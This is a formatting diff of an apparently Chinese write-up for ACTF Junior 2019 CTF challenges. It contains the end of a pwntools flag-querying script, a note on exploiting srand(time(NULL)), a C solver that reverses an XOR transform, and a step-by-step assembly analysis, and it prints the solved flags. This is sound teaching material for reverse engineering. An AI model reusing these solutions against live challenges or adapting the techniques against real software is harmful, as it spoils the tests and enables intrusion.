+</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[*] Querying flag</span><span style="color:#c0c5ce;">&quot;
+r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">5</span><span style="color:#c0c5ce;">&#39;)
+r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(name)
+r.</span><span style="color:#bf616a;">sendline</span><span style="color:#c0c5ce;">(passwd)
+flag = r.</span><span style="color:#bf616a;">recvuntil</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">}</span><span style="color:#c0c5ce;">&quot;)
+index = -</span><span style="color:#d08770;">1
+</span><span style="color:#b48ead;">try</span><span style="color:#c0c5ce;">:
+	index = flag.</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">actf</span><span style="color:#c0c5ce;">&#39;)
+</span><span style="color:#b48ead;">except</span><span style="color:#c0c5ce;">:
+	index = flag.</span><span style="color:#bf616a;">index</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">ACTF</span><span style="color:#c0c5ce;">&#39;)
+flag = flag[index:]
+</span><span style="color:#b48ead;">print </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">[flag] </span><span style="color:#d08770;">{}</span><span style="color:#c0c5ce;">&quot;.</span><span style="color:#bf616a;">format</span><span style="color:#c0c5ce;">(flag)
 </span></code></pre><h2 id="broken-random">Broken Random</h2>
 <p>这题毕竟源码都给了，要点也都提示到了，其实没什么难度。</p>
 <p>直接的攻击点在于<a href="https://github.com/CSUwangj/ACTF_Junior_2019/blob/master/Crypto/Broken%20Random/src/src.c#L14">srand(time(NULL))</a></p>
@@ -234,32 +269,32 @@ flag = flag[index:]</span><span style="color:#c0c5ce;">
 <h2 id="show-me-the-code">show me the code</h2>
 <p>我们只看比较关键的给出的代码：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">; keystr[i]; i++) {</span><span style="color:#c0c5ce;">
-		keystr[i] ^= keystr[i-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
-		keystr[i] += </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-	}</span><span style="color:#c0c5ce;">
-...</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(keystr,enstr)){</span><span style="color:#c0c5ce;">
-    ...</span><span style="color:#c0c5ce;">
-}</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
-    ...</span><span style="color:#c0c5ce;">
-}</span><span style="color:#c0c5ce;">
+<code><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">; keystr[i]; i++) {
+		keystr[i] ^= keystr[i-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];
+		keystr[i] += </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
+	}
+...
+</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(!</span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(keystr,enstr)){
+    ...
+}
+</span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">{
+    ...
+}
 </span></code></pre>
 <p>用户的输入在经过for循环的操作之后与enstr字符串比对，若相同则提示输入正确，所以我们要做的就是从给出的enstr字符串和for循环里的操作来__逆推__出正确的输入应该是怎样的。</p>
 <p>for循环里从第1位字符开始每个字符异或上一位的字符之后加2，加的逆操作是减，而异或的逆操作则是再次异或相同的数，比如说(a^b)^b = a ，所以我们的逆操作应该是从enstr最后一位字符开始，每一位先减2再异或前一位，循环至第1位，代码如下：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">## include&lt;stdio.</span><span style="color:#bf616a;">h</span><span style="color:#c0c5ce;">&gt;</span><span style="color:#c0c5ce;">
-</span><span style="color:#c0c5ce;">
-</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(){</span><span style="color:#c0c5ce;">
-    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> enstr[]={</span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x04</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x52</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x16</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x6f</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x3a</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x23</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x42</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x74</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x1b</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x31</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x70</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x7b</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x26</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x56</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x64</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x3d</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x4c</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x7e</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x0e</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x27</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x08</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x77</span><span style="color:#c0c5ce;">};</span><span style="color:#c0c5ce;">
-    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> j=</span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">;j&gt;=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;j--){</span><span style="color:#c0c5ce;">
-		enstr[j] -= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-		enstr[j] ^= enstr[j-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
-	}</span><span style="color:#c0c5ce;">
-	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;,enstr);</span><span style="color:#c0c5ce;">
-    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-}</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;">## include&lt;stdio.</span><span style="color:#bf616a;">h</span><span style="color:#c0c5ce;">&gt;
+
+</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(){
+    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> enstr[]={</span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x04</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x52</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x16</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x6f</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x3a</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x23</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x42</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x74</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x1b</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x31</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x70</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x49</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x7b</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x26</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x56</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x64</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x3d</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x4c</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x7e</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x0e</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x41</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x27</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x08</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">0x77</span><span style="color:#c0c5ce;">};
+    </span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> j=</span><span style="color:#d08770;">25</span><span style="color:#c0c5ce;">;j&gt;=</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;j--){
+		enstr[j] -= </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
+		enstr[j] ^= enstr[j-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">];
+	}
+	</span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;,enstr);
+    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+}
 </span></code></pre>
 <p>得到flag：<strong>ACTF{W41c0m4_70_r4_w0r1d!}</strong></p>
 <h2 id="shi-wo-idala">食我ida啦</h2>
@@ -276,158 +311,159 @@ flag = flag[index:]</span><span style="color:#c0c5ce;">
 <p>根据给出的c代码我们可以知道这整个程序的流程很简单，要求输入flag后，把输入传入func函数，以func函数的返回值判断用户输入的是否为正确的flag，所以现在要做的就是分析func函数的功能从而解出flag。接下来开始一步步分析给出的func函数的汇编码：</p>
 <p>最开始的这一段分析需要掌握栈帧以及函数调用约定的相关知识，这里直接给出分析的结果：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">   0x0006fa &lt;+0&gt;:	push   rbp</span><span style="color:#c0c5ce;">
-   0x0006fb &lt;+1&gt;:	mov    rbp,rsp</span><span style="color:#c0c5ce;">
-   0x0006fe &lt;+4&gt;:	mov    QWORD PTR [rbp-0x18],rdi</span><span style="color:#c0c5ce;">
-   0x000702 &lt;+8&gt;:	mov    DWORD PTR [rbp-0x4],0x0</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;">   0x0006fa &lt;+0&gt;:	push   rbp
+   0x0006fb &lt;+1&gt;:	mov    rbp,rsp
+   0x0006fe &lt;+4&gt;:	mov    QWORD PTR [rbp-0x18],rdi
+   0x000702 &lt;+8&gt;:	mov    DWORD PTR [rbp-0x4],0x0
 </span></code></pre>
 <p>在simple.c中我们知道有这样一个调用：<code>func(input)</code> ，而上面的汇编代码实现的是将参数<code>input</code>的地址保存到<code>[rbp-0x18]</code>这个地方。之后<code>[rbp-0x4]</code>则作为一个局部变量，为其赋值为<code>0x0</code>。到这里我们可以尝试还原一下c代码：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">func</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;">){</span><span style="color:#c0c5ce;">
-    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0x0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-    ...</span><span style="color:#c0c5ce;">
-}</span><span style="color:#c0c5ce;">
+<code><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">func</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;">){
+    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0x0</span><span style="color:#c0c5ce;">;
+    ...
+}
 </span></code></pre>
 <p>我们将<code>[rbp-0x4]</code>假设为int型变量i，<code>[rbp-0x18]</code>假设为指向用户输入字符串首地址的指针input，往后看:</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;"> 0x000709 &lt;+15&gt;:	jmp    0x75d &lt;func+99&gt;</span><span style="color:#c0c5ce;">
- ...</span><span style="color:#c0c5ce;">
- 0x00075d &lt;+99&gt;:	cmp    DWORD PTR [rbp-0x4],0x15</span><span style="color:#c0c5ce;">
- 0x000761 &lt;+103&gt;:	jle    0x70b &lt;func+17&gt;</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;"> 0x000709 &lt;+15&gt;:	jmp    0x75d &lt;func+99&gt;
+ ...
+ 0x00075d &lt;+99&gt;:	cmp    DWORD PTR [rbp-0x4],0x15
+ 0x000761 &lt;+103&gt;:	jle    0x70b &lt;func+17&gt;
 </span></code></pre>
 <p>跳转到&lt;func+99&gt;后将<code>[rbp-0x4]</code>中的值（也就是i）与<code>0x15</code>比较，只要不大于<code>0x15</code>就会跳转到&lt;func+17&gt;处。因为i的初值为<code>0x0</code>，所以会实现跳转。</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;"> 0x00070b &lt;+17&gt;:	mov    eax,DWORD PTR [rbp-0x4]</span><span style="color:#c0c5ce;">
- 0x00070e &lt;+20&gt;:	movsxd rdx,eax</span><span style="color:#c0c5ce;">
- 0x000711 &lt;+23&gt;:	mov    rax,QWORD PTR [rbp-0x18]</span><span style="color:#c0c5ce;">
- 0x000715 &lt;+27&gt;:	add    rax,rdx</span><span style="color:#c0c5ce;">
- 0x000718 &lt;+30&gt;:	movzx  edx,BYTE PTR [rax]</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;"> 0x00070b &lt;+17&gt;:	mov    eax,DWORD PTR [rbp-0x4]
+ 0x00070e &lt;+20&gt;:	movsxd rdx,eax
+ 0x000711 &lt;+23&gt;:	mov    rax,QWORD PTR [rbp-0x18]
+ 0x000715 &lt;+27&gt;:	add    rax,rdx
+ 0x000718 &lt;+30&gt;:	movzx  edx,BYTE PTR [rax]
 </span></code></pre>
 <p>根据先前的假设，前四行相当于完成了<code>(input+i)</code>,使input指向第i位字符；再看最后的<code>movzx  edx,BYTE PTR [rax]</code>,这里实现了寻址到<code>(input+i)</code>所表示的地址处并将此地址内存储的值传给edx，写成伪c代码相当于<code>edx = *(input + i)</code> 。</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;"> 0x00071b &lt;+33&gt;:	mov    eax,DWORD PTR [rbp-0x4]</span><span style="color:#c0c5ce;">
- 0x00071e &lt;+36&gt;:	movsxd rcx,eax</span><span style="color:#c0c5ce;">
- 0x000721 &lt;+39&gt;:	mov    rax,QWORD PTR [rbp-0x18]</span><span style="color:#c0c5ce;">
- 0x000725 &lt;+43&gt;:	add    rax,rcx</span><span style="color:#c0c5ce;">
- 0x000728 &lt;+46&gt;:	add    edx,0x7</span><span style="color:#c0c5ce;">
- 0x00072b &lt;+49&gt;:	mov    BYTE PTR [rax],dl</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;"> 0x00071b &lt;+33&gt;:	mov    eax,DWORD PTR [rbp-0x4]
+ 0x00071e &lt;+36&gt;:	movsxd rcx,eax
+ 0x000721 &lt;+39&gt;:	mov    rax,QWORD PTR [rbp-0x18]
+ 0x000725 &lt;+43&gt;:	add    rax,rcx
+ 0x000728 &lt;+46&gt;:	add    edx,0x7
+ 0x00072b &lt;+49&gt;:	mov    BYTE PTR [rax],dl
 </span></code></pre>
 <p>这里是比较关键的一个点，前四行进行的是与上一段相同的工作，到了第五行出现了使<code>edx</code>的值加7的操作，而在之前的分析中此时<code>edx</code>中存放的是<code>*(input+i)</code>，最后一行则是将加7之后的结果赋给原<code>(input+i)</code>的地址处。综上，上面的两段汇编实现了:  <code> *(input+i) += 7</code>，继续往下看：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">   0x00072d &lt;+51&gt;:	mov    eax,DWORD PTR [rbp-0x4]</span><span style="color:#c0c5ce;">
-   0x000730 &lt;+54&gt;:	movsxd rdx,eax</span><span style="color:#c0c5ce;">
-   0x000733 &lt;+57&gt;:	mov    rax,QWORD PTR [rbp-0x18]</span><span style="color:#c0c5ce;">
-   0x000737 &lt;+61&gt;:	add    rax,rdx</span><span style="color:#c0c5ce;">
-   0x00073a &lt;+64&gt;:	movzx  ecx,BYTE PTR [rax]</span><span style="color:#c0c5ce;">
-   0x00073d &lt;+67&gt;:	mov    eax,DWORD PTR [rbp-0x4]</span><span style="color:#c0c5ce;">
-   0x000740 &lt;+70&gt;:	movsxd rdx,eax</span><span style="color:#c0c5ce;">
-   0x000743 &lt;+73&gt;:	lea    rax,[rip+0x2008f6]        ##  0x201040 &lt;enstr&gt;</span><span style="color:#c0c5ce;">
-   0x00074a &lt;+80&gt;:	movzx  eax,BYTE PTR [rdx+rax*1]</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;">   0x00072d &lt;+51&gt;:	mov    eax,DWORD PTR [rbp-0x4]
+   0x000730 &lt;+54&gt;:	movsxd rdx,eax
+   0x000733 &lt;+57&gt;:	mov    rax,QWORD PTR [rbp-0x18]
+   0x000737 &lt;+61&gt;:	add    rax,rdx
+   0x00073a &lt;+64&gt;:	movzx  ecx,BYTE PTR [rax]
+   0x00073d &lt;+67&gt;:	mov    eax,DWORD PTR [rbp-0x4]
+   0x000740 &lt;+70&gt;:	movsxd rdx,eax
+   0x000743 &lt;+73&gt;:	lea    rax,[rip+0x2008f6]        ##  0x201040 &lt;enstr&gt;
+   0x00074a &lt;+80&gt;:	movzx  eax,BYTE PTR [rdx+rax*1]
 </span></code></pre>
 <p>前5行做的是一样的事，写成伪代码就是 <code>ecx = *(input + i)</code> ; 之后2行则为<code>rdx = i</code>; 最后2行比较关键，<code>lea    rax,[rip+0x2008f6]</code>所做的是将simple.c中给出的字符数组<code>enstr</code>的首地址存入<code>rax</code>，而后综合前面的分析可以得出伪代码<code> eax = *(enstr + i)</code>，之后是比较和跳转操作：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">   0x00074e &lt;+84&gt;:	cmp    cl,al</span><span style="color:#c0c5ce;">
-   0x000750 &lt;+86&gt;:	je     0x759 &lt;func+95&gt;</span><span style="color:#c0c5ce;">
-   0x000752 &lt;+88&gt;:	mov    eax,0x1</span><span style="color:#c0c5ce;">
-   0x000757 &lt;+93&gt;:	jmp    0x768 &lt;func+110&gt;</span><span style="color:#c0c5ce;">
-   0x000759 &lt;+95&gt;:	add    DWORD PTR [rbp-0x4],0x1</span><span style="color:#c0c5ce;">
-   0x00075d &lt;+99&gt;:	cmp    DWORD PTR [rbp-0x4],0x15</span><span style="color:#c0c5ce;">
-   0x000761 &lt;+103&gt;:	jle    0x70b &lt;func+17&gt;</span><span style="color:#c0c5ce;">
-   0x000763 &lt;+105&gt;:	mov    eax,0x0</span><span style="color:#c0c5ce;">
-   0x000768 &lt;+110&gt;:	pop    rbp</span><span style="color:#c0c5ce;">
-   0x000769 &lt;+111&gt;:	ret</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;">   0x00074e &lt;+84&gt;:	cmp    cl,al
+   0x000750 &lt;+86&gt;:	je     0x759 &lt;func+95&gt;
+   0x000752 &lt;+88&gt;:	mov    eax,0x1
+   0x000757 &lt;+93&gt;:	jmp    0x768 &lt;func+110&gt;
+   0x000759 &lt;+95&gt;:	add    DWORD PTR [rbp-0x4],0x1
+   0x00075d &lt;+99&gt;:	cmp    DWORD PTR [rbp-0x4],0x15
+   0x000761 &lt;+103&gt;:	jle    0x70b &lt;func+17&gt;
+   0x000763 &lt;+105&gt;:	mov    eax,0x0
+   0x000768 &lt;+110&gt;:	pop    rbp
+   0x000769 &lt;+111&gt;:	ret
 </span></code></pre>
 <p>由之前的分析可以很容易看懂这里第一行的<code>cmp</code>操作:<code>*(input + i)</code>与<code>*(enstr + i)</code>比对（此时<code>*(input + i)</code>已经经过了加7的操作），相等则跳转到&lt;func+95&gt;继续执行，i的值加1，又进入&lt;func+99&gt;处的判断（可知这里应该是个while循环），直到i的值大于0x15后，给<code>eax</code>赋0，即此函数的返回值将为0，退回栈帧后返回；不相等则给<code>eax</code>赋1，即此函数的返回值将为1，跳转到&lt;func+110&gt;退回栈帧后返回。综合所有分析，完成c代码的还原:</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">func</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;">){</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;i&lt;=</span><span style="color:#d08770;">21</span><span style="color:#c0c5ce;">;i++){</span><span style="color:#c0c5ce;">
-		input[i]+=</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(input[i]!=enstr[i]){</span><span style="color:#c0c5ce;">
-			</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-		}</span><span style="color:#c0c5ce;">
-	}</span><span style="color:#c0c5ce;">
-	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
-}</span><span style="color:#c0c5ce;">
+<code><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">func</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;">){
+	</span><span style="color:#b48ead;">for</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i=</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;i&lt;=</span><span style="color:#d08770;">21</span><span style="color:#c0c5ce;">;i++){
+		input[i]+=</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">;
+		</span><span style="color:#b48ead;">if</span><span style="color:#c0c5ce;">(input[i]!=enstr[i]){
+			</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
+		}
+	}
+	</span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
+}
 </span></code></pre>
 <p>我们只要将给出的<code>enstr</code>所有值减7，就能拿到flag：</p>
 <p>__ACTF{a5m_15_1mp0r7an7} __</p>
 <h2 id="guan-yu-wo-f5yi-hou-huan-shi-gao-bu-dong-ta-zai-xiang-xie-shi-yao-zhe-dang-shi">关于我F5以后还是搞不懂他在想些什么这档事</h2>
 <p>把文件放入ida分析，进入<code>main</code> 函数以后F5查看c代码。在接收用户输入以后有很长的一段代码：</p>
 <pre style="background-color:#2b303b;">
-<code><span style="color:#c0c5ce;">  v3 = </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x82</span><span style="color:#b48ead;">uLL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
-  v14 = v3;</span><span style="color:#c0c5ce;">
-  v4 = qword_55FA3685F068;</span><span style="color:#c0c5ce;">
-  *(_QWORD *)v3 = func_s;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) = v4;</span><span style="color:#c0c5ce;">
-  v5 = qword_55FA3685F078;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">) = qword_55FA3685F070;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">) = v5;</span><span style="color:#c0c5ce;">
-  v6 = qword_55FA3685F088;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">) = qword_55FA3685F080;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">) = v6;</span><span style="color:#c0c5ce;">
-  v7 = qword_55FA3685F098;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">) = qword_55FA3685F090;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">) = v7;</span><span style="color:#c0c5ce;">
-  v8 = qword_55FA3685F0A8;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) = qword_55FA3685F0A0;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">) = v8;</span><span style="color:#c0c5ce;">
-  v9 = qword_55FA3685F0B8;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">) = qword_55FA3685F0B0;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;">) = v9;</span><span style="color:#c0c5ce;">
-  v10 = qword_55FA3685F0C8;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">) = qword_55FA3685F0C0;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">13</span><span style="color:#c0c5ce;">) = v10;</span><span style="color:#c0c5ce;">
-  v11 = qword_55FA3685F0D8;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">14</span><span style="color:#c0c5ce;">) = qword_55FA3685F0D0;</span><span style="color:#c0c5ce;">
-  *((_QWORD *)v3 + </span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">) = v11;</span><span style="color:#c0c5ce;">
-  *((_WORD *)v3 + </span><span style="color:#d08770;">64</span><span style="color:#c0c5ce;">) = word_55FA3685F0E0;</span><span style="color:#c0c5ce;">
+<code><span style="color:#c0c5ce;">  v3 = </span><span style="color:#96b5b4;">malloc</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">0x82</span><span style="color:#b48ead;">uLL</span><span style="color:#c0c5ce;">);
+  v14 = v3;
+  v4 = qword_55FA3685F068;
+  *(_QWORD *)v3 = func_s;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">) = v4;
+  v5 = qword_55FA3685F078;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">) = qword_55FA3685F070;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">3</span><span style="color:#c0c5ce;">) = v5;
+  v6 = qword_55FA3685F088;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">) = qword_55FA3685F080;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">) = v6;
+  v7 = qword_55FA3685F098;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">6</span><span style="color:#c0c5ce;">) = qword_55FA3685F090;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;">) = v7;
+  v8 = qword_55FA3685F0A8;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">) = qword_55FA3685F0A0;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">9</span><span style="color:#c0c5ce;">) = v8;
+  v9 = qword_55FA3685F0B8;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">10</span><span style="color:#c0c5ce;">) = qword_55FA3685F0B0;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">11</span><span style="color:#c0c5ce;">) = v9;
+  v10 = qword_55FA3685F0C8;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">12</span><span style="color:#c0c5ce;">) = qword_55FA3685F0C0;
+  *((_QWORD *)v3 + </span><span style="color:#d08770;">13</span><span style="color:#c0c5ce;">) = v10;
